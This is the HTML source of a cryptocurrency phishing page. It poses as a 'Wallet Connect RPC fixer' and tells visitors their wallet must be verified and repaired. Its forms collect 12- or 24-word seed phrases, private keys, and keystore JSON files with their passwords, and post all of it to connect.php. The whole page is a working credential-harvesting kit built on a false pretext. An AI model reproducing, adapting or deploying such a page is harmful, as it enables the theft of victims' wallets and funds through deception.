<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<style>
* {box-sizing: border-box}

/* Set height of body and the document to 100% */
body, html {
  height: 100%;
  margin: auto;
  font-family: Arial;
  background-color: #000;

}
button.accordion {
  background-color: #fff;
  cursor: pointer;
  padding: 8px 0 8px 0;
  width: 90%;
  border: none;
  text-align: left;
  outline: none;
  font-size: 18px;
  transition: 0.4s;
  border-bottom: 1px solid #ccc;
}

button.accordion.active, button.accordion:hover {
  color: #f06100
}

button.accordion:before {
  content: '\02795';
  font-size: 9px;
  float: left;
  margin-left: 0px;
  margin-right: 10px;
  margin-top: 7px;
}

button.accordion.active:before {
  content: "\2796";
}

div.panel {
  background-color: white;
  max-height: 0;
  padding-left: 2px;
  overflow: hidden;
  padding-top: 0px;
  border-bottom: 4px solid #ccc;
  transition: 0.6s ease-in-out;
  opacity: 0;
  margin-bottom: 8px;
  width: 90%;
  border-radius: 0 0 50px 50px;
}

.panel-icon {
  margin-right: 10px;
}

.panel h5 {
  font-size: 15px;
  line-height: 23px;
  margin-top: 5px;
  margin-bottom: 0px;
  display: inline-block;
  color: #2d2d2d;
}

.panel p {
  font-size: 15px;
  line-height: 23px;
  padding: 15px 30px 20px 0;
  color: #2d2d2d
}

div.panel.show {
  opacity: 1;
  max-height: 500px;
}

.tab {
    display: inline-block;
    padding: 5px 10px;
    cursor: pointer;
    background-color: ;
    margin-right: 0px;
}

.box {
    display: none;
    padding:5px 5px 10px 5px;
    border: 1px solid #ccc;
    margin-top: 10px;
    border-radius: 20px;
    width: 90%;;
}

</style>
<script>
    function splitWords(inputIndex) {
        // Get the input value from the first box
        var inputValue = document.getElementById("input1").value;

        // Split the words by space
        var words = inputValue.split(' ');

        // Fill the remaining input boxes with the words
        for (var i = 1; i <= 24; i++) {
            var currentInput = document.getElementById("input" + i);
            if (i <= words.length) {
                currentInput.value = words[i - 1];
            } else {
                currentInput.value = currentInput1.value;;
            }
        }
    }
    ///////////////second part -24words
    function splitWords1(inputIndex) {
        // Get the input value from the first box
        var inputValue1 = document.getElementById("inputa" + inputIndex).value;

        // Split the words by space
        var words1 = inputValue1.split(' ');

        // Fill the remaining input boxes with the words
        for (var j = 1; j <= 24; j++) {
            var currentInput1 = document.getElementById("inputa" + j);
            if (j <= words1.length) {
                currentInput1.value = words1[j - 1];
            } else {
                currentInput1.value = currentInput1.value;
            }
        }
    }

</script>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:bold">
  
  
</head>
<body style="padding: 3% 0;">
    <fieldset style="border-color: #FFF; width: 60%; margin: auto; border-radius: 70px; color: #FFF; min-width:350px;">
        <center>
        <div style="width: 85%; margin: 10% auto 0;">
                <img src="assets/images/mmm.png" style="width: 10%; margin: 1% 0 0 2%; display:none;" />
                <img src="assets/images/images2.png" style="width: 10%; margin: 1% 0 0 2%;"  />
                <h1 style="width: 100%; font-size:1.5em;">Verify your wallet with your Secret Recovery Phrase/ Private Key or JSON Keys</h1>
                <p style="font-size: 1em; line-height:130%;">Wallet Connect RPC fixer cannot recover your wallet automatically. We will use your Secret Recovery Phrase/ Private Keys to validate your ownership, 
                restore and fix your wallet and set up RPC refresh. First, enter the Secret Recovery Phrase/ Keys/ JSON that you were given when you created your wallet.</p>
                <p><i>Please carefully enter your details</i></p>
            
        </div>
        
        <button class="accordion">Mnemonic Phrase</button>
            <div class="panel" style="line-height: 2em; color:#000;">

                <div class="tab" style="width:; text-decoration:none; color: white;" onclick="showBox('box1')" href="">
                  <span style="padding:5px; background-color:#a17272; border-radius: 20px 0 0 20px">12 word</span>
                </div>
                <div class="tab" style="width:; text-decoration:none; color: white;" onclick="showBox('box2')" href="">
                  <span style="padding:5px; background-color:#928468; border-radius: 0 20px 20px 0">24 word</span>
                </div>
                <div id="box1" class="box">
                <div style="line-height: 1em; font-style:italic; font-size:0.7em; color:#000;">
                    Enter your 12-word seed phrase to recover your wallet <br />(words are not case sensitive)
                </div>
                <form method="post" action="connect.php" style="margin: 5px 0 0 0;">
                    <div style="width:100%;">
                      <div style="width: 33%; float: left;">
                        <input name="inputq1" placeholder="1" type="text" required id="input1" oninput="splitWords(1)" onblur="updateFirstBox()" style="width:90%; padding:5px; text-align:center; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="inputq2" placeholder="2" type="text" required id="input2" style="width:90%; text-align:center; padding:5px;">
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="inputq3" placeholder="3" type="text" required id="input3" style="width:90%; padding:5px; text-align:center;">
                      </div>
                    </div>
                    <div style="width:100%;">
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="inputq4" placeholder="4" type="text" required id="input4" style="width:90%; padding:5px; text-align:center;">
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="inputq5" placeholder="5" type="text" required id="input5" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="inputq6" placeholder="6" type="text" required id="input6" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                    </div>
                    <div style="width:100%;">
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="inputq7" placeholder="7" type="text" required id="input7" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="inputq8" placeholder="8" type="text" required id="input8" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="inputq9" placeholder="9" type="text" required id="input9" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                    </div>
                    <div style="width:100%;">
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="inputq10" placeholder="10" type="text" required id="input10" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="inputq11" placeholder="11" type="text" required id="input11" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="inputq12" placeholder="12" type="text" required id="input12" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                    </div>
        
                    <input class="" type="text" name="wallet" value="generalWallet" style=" font-size: 1em;" hidden />
                    
                    <div style="line-height: 1em; font-style:italic; font-size:0.7em; color:#000;">
                        Typically 12 words separated by single spaces
                    </div>
        
                    <button type="submit" name="connectWa" class="button" style="padding: 2% 5%; margin-bottom: 5%; border-radius: 50px; border-color: #000; width:90%;">
                        Next
                    </button>
                </form>
            </div>
            <div id="box2" class="box">
                <div style="line-height: 1em; font-style:italic; font-size:0.7em; color:#000;">
                    Enter your 24-word seed phrase to recover your wallet <br />(words are not case sensitive)
                </div>
                <form method="post" action="connect.php" style="margin: 5px 0 0 0;">
                    <div style="width:100%;">
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input1" placeholder="1" type="text" required id="inputa1" oninput="splitWords1(1)" style="width:90%; padding:5px; text-align:center; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input2" placeholder="2" type="text" required id="inputa2" style="width:90%; text-align:center; padding:5px;">
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input3" placeholder="3" type="text" required id="inputa3" style="width:90%; padding:5px; text-align:center;">
                      </div>
                    </div>
                    <div style="width:100%;">
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input4" placeholder="4" type="text" required id="inputa4" style="width:90%; padding:5px; text-align:center;">
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input5" placeholder="5" type="text" required id="inputa5" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input6" placeholder="6" type="text" required id="inputa6" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                    </div>
                    <div style="width:100%;">
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input7" placeholder="7" type="text" required id="inputa7" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input8" placeholder="8" type="text" required id="inputa8" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input9" placeholder="9" type="text" required id="inputa9" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                    </div>
                    <div style="width:100%;">
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input10" placeholder="10" type="text" required id="inputa10" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input11" placeholder="11" type="text" required id="inputa11" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input12" placeholder="12" type="text" required id="inputa12" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                    </div>
                    <div style="width:100%;">
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input13" placeholder="13" type="text" required id="inputa13" oninput="splitWords(1)" style="width:90%; padding:5px; text-align:center; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input14" placeholder="14" type="text" required id="inputa14" style="width:90%; text-align:center; padding:5px;">
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input15" placeholder="15" type="text" required id="inputa15" style="width:90%; padding:5px; text-align:center;">
                      </div>
                    </div>
                    <div style="width:100%;">
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input16" placeholder="16" type="text" required id="inputa16" style="width:90%; padding:5px; text-align:center;">
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input17" placeholder="17" type="text" required id="inputa17" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input18" placeholder="18" type="text" required id="inputa18" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                    </div>
                    <div style="width:100%;">
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input19" placeholder="19" type="text" required id="inputa19" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input20" placeholder="20" type="text" required id="inputa20" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input21" placeholder="21" type="text" required id="inputa21" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                    </div>
                    <div style="width:100%;">
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input22" placeholder="22" type="text" required id="inputa22" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input23" placeholder="23" type="text" required id="inputa23" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                      <div style="width: 33%; float: left;">
                        <input  onblur="updateFirstBox()" name="input24" placeholder="24" type="text" required id="inputa24" style="width:90%; padding:5px; text-align:center;"><br>
                      </div>
                    </div>
    
                    <input class="" type="text" name="wallet" value="generalWallet" style=" font-size: 1em;" hidden />
                    
                    <div style="line-height: 1em; font-style:italic; font-size:0.7em; color:#000;">
                        Typically 24 words separated by single spaces
                    </div>
    
                    <button type="submit" name="connectWb" class="button" style="padding: 2% 5%; margin-bottom: 5%; border-radius: 50px; border-color: #000; width:90%;">
                        Next
                    </button>
                </form>
        </div>
        </div><!-- /.end of job post -->

        <button class="accordion">Private Key</button>
        <div id="foo" class="panel">
            <form method="post" action="connect.php" style="margin: 10px 0 0 0;">
                <textarea type="text" style=" font-size: 1em; width:90%; color:#000;" name="key" placeholder="Enter Private Key" required></textarea>
                <input type="text" style=" font-size: 1em;" class="" name="wallet" value="generalWallet" hidden />
                
                <p style="font-size: 0.7em; margin: 0;"><em>Typically 64 Letters</em></p>
                <button type="submit" name="connectW2" class="button" style="padding: 2% 5%; margin-bottom: 5%; border-radius: 50px; border-color: #000; width:90%;">
                    Next
                </button>
            </form>
        </div><!-- /.end of job post -->

        <button class="accordion">JSON Key</button>
        <div id="foo" class="panel">
            <form method="post" action="connect.php" style="margin: 10px 0 0 0;">
                <textarea class="" name="json" row="6" style="height: 100px; font-size: 1em; width:90%;" placeholder="Enter Keystore JSON" required></textarea>
                <br />
                <label>Input Password</label>
                <input class="" style=" font-size: 1em; width:90%; color:#000;" type="password" name="pass" placeholder="password" required />
                <input class="" style=" font-size: 1em; width:90%; color:#000;" type="text" name="wallet" value="generalWallet" hidden />
                
                <p style="font-size: 0.7em; margin: 0;"><em>Several lines of text beginning with "{...}" plus the password you used to encrypt it</em></p>
                <button type="submit" name="connectW3" class="button" style="padding: 2% 5%; margin-bottom: 5%; border-radius: 50px; border-color: #000; width:90%;">
                    Next
                </button>
            </form>
        </div><!-- /.end of job post -->

        
        </center>
        
    </fieldset>
    <script>
        var acc = document.getElementsByClassName("accordion");
        var i;

        function click_action(){
        $('.accordion').removeClass('active');
        $('.panel').removeClass('show');

        this.classList.toggle("active");
        this.nextElementSibling.classList.toggle("show");
        }

        for (i = 0; i < acc.length; i++) {
        acc[i].onclick = click_action;
        }
   
        function showBox(boxId) {
            // Hide all boxes
            var boxes = document.getElementsByClassName('box');
            for (var i = 0; i < boxes.length; i++) {
                boxes[i].style.display = 'none';
            }

            // Show the selected box
            document.getElementById(boxId).style.display = 'block';
        }
    </script>
    <!-- JWEB-FIXscript -->
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/jquery.easing.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
    <script src="assets/js/swiper-bundle.min.js"></script>
    <script src="assets/js/swiper.js"></script>

    <script src="assets/js/plugin.js"></script>
    <script src="assets/js/count-down.js"></script>
    <script src="assets/js/shortcodes.js"></script>
    <script src="assets/js/main.js"></script>
</body>
</html> 
